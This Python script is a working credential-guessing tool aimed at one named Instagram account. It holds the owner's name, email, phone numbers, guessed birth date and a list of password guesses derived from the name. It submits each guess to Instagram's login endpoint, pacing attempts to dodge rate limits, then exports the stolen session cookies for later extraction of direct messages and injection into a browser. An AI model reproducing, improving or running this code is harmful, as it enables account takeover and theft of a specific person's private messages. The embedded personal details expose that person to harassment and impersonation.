# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔑 Instagram Auto Session Exporter
Auto login และ export sessionid + cookies สำหรับ Playwright
"""
import requests
import json
import time
import random
from datetime import datetime
import os

class InstagramSessionExporter:
    def __init__(self):
        self.target_data = {
            "username": "alx.trading",
            "full_name": "Alex Fleming",
            "dob_guess": "1998-11-20",
            "email": "alex@tradeyourway.co.uk",
            "phone": ["+447793127209", "0615414210"],
            "known_passwords": [
                "Fleming654", "Fleming786", "Fleming1004",
                "Fleming1060", "Fleming1182", "Fleming1998",
                "alexfleming2024", "tradeyourway"
            ],
            "login_attempt_source": "DreamBruteMode"
        }

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Instagram 155.0.0.37.107 (iPhone; CPU iPhone OS 12_4 like Mac OS X)",
            "X-IG-App-ID": "936619743392459",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        })

        print("🔑 Instagram Auto Session Exporter")
        print("=" * 45)
        print(f"Target: {self.target_data['username']}")
        print(f"Passwords to test: {len(self.target_data['known_passwords'])}")
        print()

    def get_csrf_token(self):
        """Get CSRF token from Instagram"""
        try:
            response = self.session.get("https://www.instagram.com/")

            # Extract CSRF token from cookies
            csrf_token = None
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break

            if csrf_token:
                print(f"✅ Got CSRF token: {csrf_token[:10]}...")
                return csrf_token
            else:
                print("❌ Could not get CSRF token")
                return None

        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
            return None

    def attempt_login(self, username, password):
        """Attempt to login with given credentials"""
        print(f"🔄 Trying: {username}:{password}")

        # Get CSRF token first
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False, None

        # Update headers with CSRF token
        self.session.headers.update({
            "X-CSRFToken": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/"
        })

        url = "https://www.instagram.com/api/v1/accounts/login/"
        data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false"
        }

        try:
            response = self.session.post(url, data=data, timeout=15)

            print(f"📡 Response: HTTP {response.status_code}")

            if response.status_code == 200:
                response_data = response.json()

                if response_data.get("authenticated") == True:
                    print(f"✅ SUCCESS! Login successful for {username}:{password}")

                    # Extract session data
                    session_info = self.extract_session_data(response, password)
                    return True, session_info

                elif "challenge_required" in response_data:
                    print("⚠️ Challenge required (2FA/verification)")
                    return False, None

                else:
                    print(f"❌ Login failed: {response_data.get('message', 'Unknown error')}")
                    return False, None

            elif response.status_code == 400:
                print("❌ Bad request (likely wrong credentials)")
                return False, None

            elif response.status_code == 429:
                print("❌ Rate limited - need to wait")
                time.sleep(30)  # Wait 30 seconds
                return False, None

            else:
                print(f"❌ Unexpected response: {response.status_code}")
                return False, None

        except Exception as e:
            print(f"❌ Login error: {e}")
            return False, None

    def extract_session_data(self, response, password):
        """Extract session cookies and create export data"""

        session_data = {
            "login_info": {
                "username": self.target_data["username"],
                "password": password,
                "login_timestamp": datetime.now().isoformat(),
                "login_source": "auto_session_exporter"
            },
            "cookies": [],
            "sessionid": None,
            "csrf_token": None,
            "ds_user_id": None
        }

        # Extract cookies from session
        for cookie in self.session.cookies:
            cookie_data = {
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "httpOnly": hasattr(cookie, 'rest') and 'HttpOnly' in str(cookie.rest)
            }
            session_data["cookies"].append(cookie_data)

            # Extract specific important cookies
            if cookie.name == "sessionid":
                session_data["sessionid"] = cookie.value
            elif cookie.name == "csrftoken":
                session_data["csrf_token"] = cookie.value
            elif cookie.name == "ds_user_id":
                session_data["ds_user_id"] = cookie.value

        print(f"🍪 Extracted {len(session_data['cookies'])} cookies")
        print(f"🔑 SessionID: {session_data['sessionid'][:20]}..." if session_data['sessionid'] else "❌ No sessionid found")

        return session_data

    def save_session_data(self, session_data):
        """Save session data in multiple formats"""

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_filename = f"session_export_{self.target_data['username']}_{timestamp}"

        # 1. Save complete session data as JSON
        complete_file = f"{base_filename}_complete.json"
        with open(complete_file, 'w', encoding='utf-8') as f:
            json.dump(session_data, f, indent=2, ensure_ascii=False)
        print(f"💾 Complete session saved: {complete_file}")

        # 2. Save Playwright-compatible cookies
        playwright_file = f"tools/session_alx_trading.json"
        os.makedirs("tools", exist_ok=True)

        with open(playwright_file, 'w', encoding='utf-8') as f:
            json.dump(session_data["cookies"], f, indent=2, ensure_ascii=False)
        print(f"🎭 Playwright cookies saved: {playwright_file}")

        # 3. Save real data extractor format
        real_extractor_file = f"alx_trading_session_fresh.json"
        real_extractor_data = {
            "sessionid": session_data["sessionid"],
            "ds_user_id": session_data["ds_user_id"],
            "user": self.target_data["username"],
            "source": "auto_session_exporter",
            "generated_at": datetime.now().isoformat(),
            "valid": True,
            "csrf_token": session_data["csrf_token"]
        }

        with open(real_extractor_file, 'w', encoding='utf-8') as f:
            json.dump(real_extractor_data, f, indent=2, ensure_ascii=False)
        print(f"🎯 Real extractor session saved: {real_extractor_file}")

        # 4. Save simple sessionid file
        sessionid_file = f"sessionid_only.txt"
        with open(sessionid_file, 'w') as f:
            f.write(session_data["sessionid"])
        print(f"📝 SessionID only saved: {sessionid_file}")

        return {
            "complete": complete_file,
            "playwright": playwright_file,
            "real_extractor": real_extractor_file,
            "sessionid_only": sessionid_file
        }

    def run_session_export(self):
        """Main function to run session export"""

        print("🚀 Starting auto session export...")
        print(f"Testing {len(self.target_data['known_passwords'])} passwords")
        print()

        for i, password in enumerate(self.target_data["known_passwords"]):
            print(f"🔄 Attempt {i+1}/{len(self.target_data['known_passwords'])}")

            success, session_data = self.attempt_login(
                self.target_data["username"],
                password
            )

            if success and session_data:
                print("🎉 LOGIN SUCCESSFUL!")

                # Save session data in multiple formats
                saved_files = self.save_session_data(session_data)

                print("\n✅ SESSION EXPORT COMPLETE!")
                print("=" * 45)
                print("📁 Files created:")
                for desc, filename in saved_files.items():
                    print(f"   {desc}: {filename}")

                print("\n🎭 Ready for:")
                print("   • Playwright DM extraction")
                print("   • Real data extractor")
                print("   • Browser session injection")

                return True

            # Random delay between attempts
            delay = random.uniform(3.0, 6.0)
            print(f"⏱️ Waiting {delay:.1f}s before next attempt...")
            time.sleep(delay)

        print("\n❌ All login attempts failed")
        print("💡 Possible reasons:")
        print("   • None of the passwords are correct")
        print("   • Account has 2FA enabled")
        print("   • IP/account temporarily blocked")
        print("   • Account locked or disabled")

        return False

def main():
    exporter = InstagramSessionExporter()
    success = exporter.run_session_export()

    if success:
        print("\n🚀 Next steps:")
        print("1. Run Playwright DM extractor: python3 playwright_dm_extractor.py")
        print("2. Or run real data extractor: python3 real_data_extractor.py")
        print("3. Or inject session into browser manually")

if __name__ == "__main__":
    main()
